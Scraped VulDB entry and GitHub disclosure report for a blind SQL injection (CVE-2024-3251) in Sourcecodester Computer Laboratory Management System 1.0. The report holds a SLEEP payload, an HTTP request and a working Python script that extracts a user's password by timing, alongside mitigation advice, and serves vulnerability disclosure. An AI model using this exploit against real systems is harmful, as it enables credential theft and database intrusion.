=== Content from vuldb.com_aad3f24c_20250110_210118.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)üõ° Home[Submit](?submit)309091
# Submit #309091: Sourcecodester Computer Laboratory Management System v1.0 SQL injection[info](?kb.submission)

| Title | Sourcecodester Computer Laboratory Management System v1.0 SQL injection |
| --- | --- |
| Description | An SQL Injection vulnerability has been identified in the /view\_borrow function via the id parameter of Sourcecodester Computer Laboratory Management System affecting version 1.0 The vulnerability arises due to insufficient input validation and sanitation of user-supplied data in the /view\_borrow function. An attacker can exploit this vulnerability to execute arbitrary SQL commands in the application's backend database, leading to unauthorized access, data exfiltration, or database corruption. |
| Source | ‚ö†Ô∏è https://github.com/0xAlmighty/Vulnerability-Research/blob/main/SourceCodester/CLMS/SourceCodester-CLMS-SQLi.md |
| User | [almightysec (UID 67229)](?user.67229) |
| Submission | 04/02/2024 11:02 PM (9 months ago) |
| Moderation | 04/03/2024 07:05 AM (8 hours later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [259100](?id.259100) [SourceCodester Computer Laboratory Management System 1.0 view\_borrow id sql injection] |
| Points | 20 |

[‚óÇ Previous](?submit.309090)[Overview](?submit)[Next ‚ñ∏](?submit.309092)

# Are you interested in using VulDB?

Download the whitepaper to learn more about our service!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[¬© 1997-2025 vuldb.com](?kb.terms) ¬∑ [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.309091 "German") ¬∑ [fr](/fr/?submit.309091 "French") ¬∑ [it](/it/?submit.309091 "Italian") ¬∑ [es](/es/?submit.309091 "Spanish") ¬∑ [pt](/pt/?submit.309091 "Portuguese") ¬∑ [ru](/ru/?submit.309091 "Russian") ¬∑ [pl](/pl/?submit.309091 "Polish") ¬∑ [sv](/sv/?submit.309091 "Swedish") ¬∑ [zh](/zh/?submit.309091 "Chinese") ¬∑ [ja](/ja/?submit.309091 "Japanese") ¬∑ [ar](/ar/?submit.309091 "Arabic")[v18.14.7](?kb.changelog)

=== Content from github.com_6ccf1a26_20250110_210117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xAlmighty%2FVulnerability-Research%2Fblob%2Fmain%2FSourceCodester%2FCLMS%2FSourceCodester-CLMS-SQLi.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xAlmighty%2FVulnerability-Research%2Fblob%2Fmain%2FSourceCodester%2FCLMS%2FSourceCodester-CLMS-SQLi.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=0xAlmighty%2FVulnerability-Research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xAlmighty](/0xAlmighty)
/
**[Vulnerability-Research](/0xAlmighty/Vulnerability-Research)**
Public

* [Notifications](/login?return_to=%2F0xAlmighty%2FVulnerability-Research) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2F0xAlmighty%2FVulnerability-Research)
* [Star
   1](/login?return_to=%2F0xAlmighty%2FVulnerability-Research)

* [Code](/0xAlmighty/Vulnerability-Research)
* [Issues
  0](/0xAlmighty/Vulnerability-Research/issues)
* [Pull requests
  0](/0xAlmighty/Vulnerability-Research/pulls)
* [Actions](/0xAlmighty/Vulnerability-Research/actions)
* [Projects
  0](/0xAlmighty/Vulnerability-Research/projects)
* [Security](/0xAlmighty/Vulnerability-Research/security)
* [Insights](/0xAlmighty/Vulnerability-Research/pulse)

Additional navigation options

* [Code](/0xAlmighty/Vulnerability-Research)
* [Issues](/0xAlmighty/Vulnerability-Research/issues)
* [Pull requests](/0xAlmighty/Vulnerability-Research/pulls)
* [Actions](/0xAlmighty/Vulnerability-Research/actions)
* [Projects](/0xAlmighty/Vulnerability-Research/projects)
* [Security](/0xAlmighty/Vulnerability-Research/security)
* [Insights](/0xAlmighty/Vulnerability-Research/pulse)

## Files

¬†main
## Breadcrumbs

1. [Vulnerability-Research](/0xAlmighty/Vulnerability-Research/tree/main)
2. /[SourceCodester](/0xAlmighty/Vulnerability-Research/tree/main/SourceCodester)
3. /[CLMS](/0xAlmighty/Vulnerability-Research/tree/main/SourceCodester/CLMS)
/
# SourceCodester-CLMS-SQLi.md

Copy path Blame  Blame
## Latest commit

## History

[History](/0xAlmighty/Vulnerability-Research/commits/main/SourceCodester/CLMS/SourceCodester-CLMS-SQLi.md)186 lines (143 loc) ¬∑ 9.84 KB¬†main
## Breadcrumbs

1. [Vulnerability-Research](/0xAlmighty/Vulnerability-Research/tree/main)
2. /[SourceCodester](/0xAlmighty/Vulnerability-Research/tree/main/SourceCodester)
3. /[CLMS](/0xAlmighty/Vulnerability-Research/tree/main/SourceCodester/CLMS)
/
# SourceCodester-CLMS-SQLi.md

Top
## File metadata and controls

* Preview
* Code
* Blame

186 lines (143 loc) ¬∑ 9.84 KB[Raw](https://github.com/0xAlmighty/Vulnerability-Research/raw/refs/heads/main/SourceCodester/CLMS/SourceCodester-CLMS-SQLi.md)
# Vulnerability Proof of Concept Report

## Summary

* **CVE ID**: CVE-2024-3251
* **Vendor**: Sourcecodester
* **Product**: Computer Laboratory Management System
* **Product Link:** <https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html>
* **Affected Versions**: v1.0
* **Fixed in Version**: Not Fixed
* **Vulnerability Type**: Time-Based Blind SQL Injection
* **Severity**: Critical
* **Researchers**: Simon Bertrand (Almightysec)
* **Disclosure Date**: 04/01/2024

## Vulnerability Description

An SQL Injection vulnerability has been identified in the /view\_borrow function via the id parameter of **Sourcecodester Computer Laboratory Management System** affecting **version 1.0** The vulnerability arises due to insufficient input validation and sanitation of user-supplied data in the /view\_borrow function. An attacker can exploit this vulnerability to execute arbitrary SQL commands in the application's backend database, leading to unauthorized access, data exfiltration, or database corruption.

## Affected Components

The SQL injection vulnerability affects the `view_borrow` function, specifically through the `id` parameter in the URL path. This component is part of the administrative backend of the Computer Laboratory Management System, intended for managing borrowing records.

* **URL Path**: `/admin/?page=borrow/view_borrow&id=`
* **Parameter**: `id`
* **Function**: `view_borrow`
* **Location**: Administrative backend, under the Borrows management section.

This vulnerability is present in the application's handling of dynamic SQL queries without proper validation or sanitation of user-supplied input. As a result, an attacker can manipulate the `id` parameter to inject arbitrary SQL commands, potentially leading to unauthorized access, data exfiltration, or manipulation of the database.

The issue arises within the web application's server-side processing of the URL parameter. It does not properly sanitize input before incorporating it into SQL queries that are executed against the backend database. This oversight makes it possible to execute unintended SQL commands, affecting the database's integrity and confidentiality.

## Steps to Reproduce

Follow these steps to reproduce the vulnerability. Please use this section responsibly, ensuring that only authorized individuals can perform these actions in a safe and legal environment.

1. **Environment Setup**:
   * Download the `.zip` file from Sourcecodester: [Computer Laboratory Management System](https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html)
   * Follow installation instruction from Sourcecodester
2. **Initial Conditions**:
   * From the Administration panel, create a low priv user.
   * Log out from the Administrator account
   * Login as low priv user.
3. **Reproduction Steps**:
   * Step 1: Click on `Borrows` tab
   * Step 2: Click on `View`
   * Step 3: Capture request and send to Repeater.
   * Step 4: Test with `sleep` payload `'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))exploit)--+`

### POC:

[![Burp](https://github.com/0xAlmighty/Vulnerability-Research/raw/main/SourceCodester/CLMS/Screenshots/3.png)](https://github.com/0xAlmighty/Vulnerability-Research/blob/main/SourceCodester/CLMS/Screenshots/3.png)

```
GET /php-lms/admin/?page=borrow/view_borrow&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))exploit)--+ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/php-lms/admin/?page=borrow
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Connection: close
```

### Exploit Code:

[![Exploit](https://github.com/0xAlmighty/Vulnerability-Research/raw/main/SourceCodester/CLMS/Screenshots/4.png)](https://github.com/0xAlmighty/Vulnerability-Research/blob/main/SourceCodester/CLMS/Screenshots/4.png)

[![Proof](https://github.com/0xAlmighty/Vulnerability-Research/raw/main/SourceCodester/CLMS/Screenshots/5.png)](https://github.com/0xAlmighty/Vulnerability-Research/blob/main/SourceCodester/CLMS/Screenshots/5.png)

```
import requests
import sys
import time

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"{Colors.HEADER}SQL injection in LMS-PHP v1.0{Colors.ENDC}")
    print(f"{Colors.OKBLUE}---------------------------------{Colors.ENDC}\n")

def print_help():
    print("Usage: python exploit.py <URL>")
    print("Example: python exploit.py http://example.com")
    sys.exit(1)

def check_condition(url, session, condition):
    injected_url = f"{url}'+AND+IF({condition},SLEEP(5),0)--+"
    start_time = time.time()
    session.get(injected_url)
    response_time = time.time() - start_time
    return response_time >= 5

def extract_char_at_pos(url, session, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"ascii(substring((SELECT password FROM lms_db.users WHERE id=1 LIMIT 1),{pos},1))>{mid}"
        if check_condition(url, session, condition):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def extract_data(url):
    session = requests.Session()
    extracted = ""
    for pos in range(1, 33):
        extracted += extract_char_at_pos(url, session, pos)
        print(f"{Colors.OKGREEN}Extracted so far: {extracted}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Full extracted data: {extracted}{Colors.ENDC}")

def main():
    banner()
    if len(sys.argv) != 2 or sys.argv[1] in ['-h', '--help']:
        print_help()

    url = sys.argv[1] + "/php-lms/admin/?page=borrow/view_borrow&id=1"
    extract_data(url)

if __name__ == "__main__":
    main()
```

## Impact Analysis

The identified SQL Injection vulnerability within the Computer Laboratory Management System poses significant risks that could lead to severe impacts on confidentiality, integrity, and availability of the system and its data. Specifically:

* **Data Exposure**: Confidential data, including student records, administrative information, and potentially sensitive personal data, could be extracted by unauthorized parties. This exposure risks privacy breaches and regulatory non-compliance.
* **Unauthorized Access**: Attackers might gain unauthorized access to other parts of the system or escalate their privileges, allowing them to alter system configurations, manipulate data, or disrupt operational integrity.
* **Service Disruption**: By exploiting this vulnerability, attackers could render the system unstable or entirely unavailable, affecting the day-to-day operations of the computer laboratory management.
* **Reputational Damage**: Incidents arising from this vulnerability could erode trust among stakeholders, including students, faculty, and administration, potentially leading to a decline in system usage and confidence in the institution's cybersecurity posture.

## Mitigation and Recommendations

To mitigate the identified vulnerability and reduce potential impacts, the following steps are recommended:

* **Immediate Patching**: If the vendor releases a patch, apply it immediately. Given the absence of a fix, consider the following temporary measures.
* **Input Validation**: Implement rigorous input validation checks to ensure only expected data types and formats are processed. Use allowlists for allowable characters in inputs.
* **Prepared Statements**: Transition to using prepared statements with parameterized queries in all database interactions to effectively neutralize SQL Injection attacks.
* **Error Handling**: Customize error messages to avoid revealing details about the database structure or pointing to existing vulnerabilities.
* **Regular Auditing**: Conduct regular security audits and vulnerability assessments of the system to identify and mitigate potential vulnerabilities proactively.
* **Security Awareness**: Enhance security awareness among developers and administrators regarding common vulnerabilities and secure coding practices.

## Vendor Communication

Detail the timeline of communication with the vendor, including when the vulnerability was reported, any responses received, and the current status of the vulnerability.

* **Reported On**: 04/01/2024 - The vulnerability was reported
* **Acknowledged On**: N/A - As of the last update, the vendor has not acknowledged the report.
* **Fixed On**: N/A - A fix for the vulnerability has not been issued.
* **CVE Assigned On**: 04/03/2024 - CVE assigned: CVE-2024-3251

Efforts to follow up with the vendor will continue, and updates will be provided as new information becomes available.

## References

External references and advisories directly related to this specific vulnerability in the Computer Laboratory Management System. The following are general resources on SQL Injection prevention techniques, best practices and links to the CVE:

1. CVE Mitre: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3251>
2. NIST: <https://nvd.nist.gov/vuln/detail/CVE-2024-3251>
3. CVE Details: <https://www.cvedetails.com/cve/CVE-2024-3251/>
4. Vuldb: <https://vuldb.com/?id.259100>
5. OWASP SQL Injection Prevention Cheat Sheet: <https://owasp.org/www-community/attacks/SQL_Injection>
6. OWASP Guide to SQL Injection: <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>

This section will be updated as the vendor provides feedback or releases patches.

## Acknowledgments

Special thanks to the cybersecurity and open-source communities for their invaluable tools and resources that support vulnerability research. Appreciation is extended to colleagues and peers for their insights and feedback during the vulnerability analysis process.

---

This report is provided "as is" for informational purposes only. The authors do not take any responsibility for misuse of this information. Researchers and testers should conduct their activities with respect to applicable laws and guidelines for ethical hacking.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


